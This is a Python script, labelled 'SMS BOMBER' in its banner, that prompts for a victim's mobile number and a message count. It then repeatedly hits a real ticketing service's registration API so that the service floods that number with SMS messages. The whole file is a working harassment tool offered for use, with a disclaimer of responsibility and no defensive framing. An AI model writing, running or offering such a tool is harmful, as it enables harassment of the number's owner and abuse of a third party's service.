import urllib2
import platform
import os
import time

try:
    raw_input
except NameError:
    raw_input = input

def banner():
    if platform.system().lower() == "windows":
        os.system("cls")
    else:
        os.system("clear")
    print("""
  /$$$$$$  /$$      /$$  /$$$$$$        /$$$$$$$   /$$$$$$  /$$      /$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$
 /$$__  $$| $$$    /$$$ /$$__  $$      | $$__  $$ /$$__  $$| $$$    /$$$| $$__  $$| $$_____/| $$__  $$
| $$  \__/| $$$$  /$$$$| $$  \__/      | $$  \ $$| $$  \ $$| $$$$  /$$$$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$ | $$ $$/$$ $$|  $$$$$$       | $$$$$$$ | $$  | $$| $$ $$/$$ $$| $$$$$$$ | $$$$$   | $$$$$$$/
 \____  $$| $$  $$$| $$ \____  $$      | $$__  $$| $$  | $$| $$  $$$| $$| $$__  $$| $$__/   | $$__  $$
 /$$  \ $$| $$\  $ | $$ /$$  \ $$      | $$  \ $$| $$  | $$| $$\  $ | $$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$/| $$ \/  | $$|  $$$$$$/      | $$$$$$$/|  $$$$$$/| $$ \/  | $$| $$$$$$$/| $$$$$$$$| $$  | $$
 \______/ |__/     |__/ \______/       |_______/  \______/ |__/     |__/|_______/ |________/|__/  |__/
  Note: I won't be responsible for any damage caused by this script. Use at your own risk.
""")

def send(num, counter, sleep):
    url = "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="
    hdr = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
        'Accept-Encoding': 'none',
        'Accept-Language': 'en-US,en;q=0.8',
        'Connection': 'keep-alive'
    }
    result_url = url + num
    req = urllib2.Request(result_url, headers=hdr)
    for x in range(counter):
        banner()
        print("Target Number          :", num)
        print("Number of Messages Sent:", x+1)
        page = urllib2.urlopen(req)
        time.sleep(sleep)

try:
    banner()
    number = raw_input("Enter mobile number: ")
    count = raw_input("Enter number of messages: ")
    throttle = raw_input("Enter sleep time (in seconds): ")
    send(number, int(count), int(throttle))
except Exception as e:
    print("Something went wrong. Please re-run this script.")
